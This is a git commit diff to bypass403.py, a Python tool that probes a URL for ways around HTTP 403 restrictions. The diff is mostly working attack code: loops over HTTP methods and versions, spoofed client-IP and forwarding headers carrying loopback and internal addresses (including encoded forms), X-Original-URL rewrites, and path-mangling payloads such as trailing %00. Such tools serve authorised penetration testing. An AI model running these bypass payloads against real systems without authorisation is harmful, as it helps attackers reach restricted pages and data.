887d0aceae9156fb457b5ed88f71fe1be4821878
cyberdefsec <maindef0000@gmail.com>
2024-06-30 02:00:19 +0300

    Update

--- bypass403.py
+++ bypass403.py
@@ -1,9 +1,10 @@
 import requests
 import getopt
 import sys
-import re
+
 
 from http.client import HTTPConnection
+from urllib.parse import urlparse
 
 USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}
 
@@ -11,6 +12,7 @@ USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/2010010
 def help():
     print("\t-u URL, --url=URL\tscan url")
     print("\t-p PATH, --path=PATH\tdir or file")
+    print("\t-r , --redirect\tfollow redirection")
     print("EXAMPLES: ")    
     print("\tbypass403.py -u http://example.com -p test")
     print("\tbypass403.py --url=http://example.com --path=test")
@@ -18,41 +20,47 @@ def help():
     
 def good_code(code, text):
     good = "[+]"
-    if code  >= 400 and code <= 526:
+    if code >= 400 and code <= 526:
         good = "[-]"
     return good + text
 
 
-def version_fuzz(url, path):
+def version_fuzz(url, path, redirect):
     version_payloads = ["HTTP/0.9",
                         "HTTP/1.0",
                         "HTTP/1.1",
                         "HTTP/2"]
     for version in version_payloads:
         HTTPConnection._http_vsn_str = version
-        resp = requests.get(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
+        resp = requests.get(f"{url}/{path}", headers=USER_AGENT, allow_redirects=redirect)
         print(good_code(resp.status_code,f" {version} [code:{resp.status_code} size:{len(resp.content)}]"))
     HTTPConnection._http_vsn_str = "HTTP/1.1"
 
         
-def methods_fuzz(url, path):    
-    resp = requests.get(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code, f" GET {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.head(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code, f" HEAD {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.put(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code, f" PUT {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.patch(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code ,f" PATCH {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.post(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code, f" POST {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.delete(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code, f" DELETE {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.options(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
-    print(good_code(resp.status_code, f" OPTIONS {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
+def methods_fuzz(url, path, redirect):
+    method_payloads = ["GET",
+                       "PUT",                       
+                       "POST",
+                       "HEAD",                       
+                       "COPY",
+                       "MOVE",
+                       "LOCK",
+                       "MKCOL",
+                       "PATCH",
+                       "TRACE",
+                       "UNLOCK",
+                       "DELETE",
+                       "SEARCH",
+                       "OPTIONS",
+                       "CONNECT"]
+    
+    for method in method_payloads:
+        resp = requests.request(method, f"{url}/{path}", headers=USER_AGENT, allow_redirects=redirect)
+        print(good_code(resp.status_code, f" {method} {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
+
 
     
-def scheme_fuzz(url, path):
+def scheme_fuzz(url, path, redirect):
     protocol_payloads = ["X-Forwarded-Protocol",
                          "X-Forwarded-Proto",
                          "X-Url-Scheme"]
@@ -62,11 +70,11 @@ def scheme_fuzz(url, path):
     
     for scheme in scheme_payloads:
         for proto in protocol_payloads:
-            resp = requests.get(f"{url}/{path}", headers={proto : scheme, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
+            resp = requests.get(f"{url}/{path}", headers={proto : scheme, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
             print(good_code(resp.status_code,f" {proto}: {scheme} [code:{resp.status_code} size:{len(resp.content)}]"))
 
     
-def headers_fuzz(url, path):
+def headers_fuzz(url, path, redirect):
     headers_payloads = ["Client-IP",
                         "True-Client-IP",
                         "Cluster-Client-IP",
@@ -100,40 +108,43 @@ def headers_fuzz(url, path):
                         "X-True-Client-IP",
                         "X-Wap-Profile"]
     
-    values_payloads = ["localhost",
-                       "localhost:80",
-                       "localhost:8080",
-                       "localhost:443",
-                       "0",
-                       "2130706433",
-                       "0x7F000001",
-                       "0177.0000.0000.0001",
-                       "127.0.0.1",                                                                     
+    values_payloads = ["0",
+                       "127.0.0.1",
                        "10.0.0.0",
                        "10.0.0.1",
                        "172.16.0.0",
                        "172.16.0.1",
                        "192.168.1.0",
                        "192.168.1.1",
+                       "2130706433",
+                       "0x7F000001",
+                       "0177.0000.0000.0001",
                        "127.0.0.1:80",
                        "127.0.0.1:8080",
                        "127.0.0.1:8000",
                        "127.0.0.1:4443",
-                       "127.0.0.1:443"]
+                       "127.0.0.1:443",
+                       "localhost",
+                       "localhost:80",
+                       "localhost:8080",
+                       "localhost:8000",                       
+                       "localhost:443",
+                       "localhost:4443"]
+
        
     for header in headers_payloads:
         for value in values_payloads:
-            resp = requests.get(f"{url}/{path}", headers={header : value, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
+            resp = requests.get(f"{url}/{path}", headers={header : value, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
             print(good_code(resp.status_code,f" {header}: {value} [code:{resp.status_code} size:{len(resp.content)}]"))
             
-    resp = requests.get(f"{url}", headers={"X-Original-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
+    resp = requests.get(f"{url}", headers={"X-Original-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
     print(good_code(resp.status_code,f" X-Original-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))
     
-    resp = requests.get(f"{url}", headers={"X-Rewrite-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
+    resp = requests.get(f"{url}", headers={"X-Rewrite-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
     print(good_code(resp.status_code,f" X-Rewrite-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))
 
             
-def paths_fuzz(url, path):
+def paths_fuzz(url, path, redirect):
     paths_payloads = [f"{url}/{path}",                      
                       f"{url}/{path.upper()}",
                       f"{url}/.{path}",
@@ -165,27 +176,31 @@ def paths_fuzz(url, path):
                       f"{url}/{path}%00"]
     
     for p in paths_payloads:
-        resp = requests.get(p, headers=USER_AGENT, allow_redirects=False)        
+        resp = requests.get(p, headers=USER_AGENT, allow_redirects=redirect)        
         print(good_code(resp.status_code, f" {p} [code:{resp.status_code} size:{len(resp.content)}]"))
 
-        
+
+def parse_url(url):
+    u = ""
+    p = ""
+    data = urlparse(url)
+    u = f"{data.scheme}://{data.netloc}"
+    if data.path[0] == '/':
+        p = data.path[1:]
+    return u, p    
+
+    
 def main():       
     url = None
-    path = None
+    redirect = False
     try:
         try:
-            opts, args = getopt.getopt(sys.argv[1:], "u:p:", ["url=", "path="])
+            opts, args = getopt.getopt(sys.argv[1:], "u:r", ["url=", "redirect"])
             for opt, arg in opts:            
-                if opt in ("-u", "--url"):
-                    if arg[-1] == '/':
-                        arg = arg[:-1]
+                if opt in ("-u", "--url"):                    
                     url = arg
-                elif opt in ("-p", "--path"):
-                    if arg[0] == '/' and len(arg) > 1:
-                        arg = arg[1:]
-                        if arg[-1] == '/':
-                            arg = arg[:-1]
-                    path = arg
+                elif opt in ("-r", "--redirect"):
+                    redirect = True
                 else:
                     help()
                     sys.exit(0)
@@ -193,33 +208,34 @@ def main():
             help()
             sys.exit(0)
             
-        if url is not None and path is not None:
-            print(f"\nURL: {url}\nPATH: {path}\n")
+        if url is not None:            
+            print(f"\nTARGET: {url}\n")            
+            url, path = parse_url(url)
             
             print("-------------------")
             print("[!] Methods fuzzing")
             print("-------------------\n")
-            methods_fuzz(url, path)
+            methods_fuzz(url, path, redirect)
 
             print("\n-------------------")
             print("[!] Scheme fuzzing")
             print("-------------------\n")
-            scheme_fuzz(url, path)
+            scheme_fuzz(url, path, redirect)
 
             print("\n-------------------")
             print("[!] Version fuzzing")
             print("-------------------\n")
-            version_fuzz(url, path)
+            version_fuzz(url, path, redirect)
             
             print("\n-----------------")
             print("[!] Paths fuzzing")
             print("-----------------\n")
-            paths_fuzz(url, path)
+            paths_fuzz(url, path, redirect)
             
             print("\n-------------------")
             print("[!] Headers fuzzing")
             print("-------------------\n")
-            headers_fuzz(url, path)
+            headers_fuzz(url, path, redirect)
         else:
             help()
     except KeyboardInterrupt:
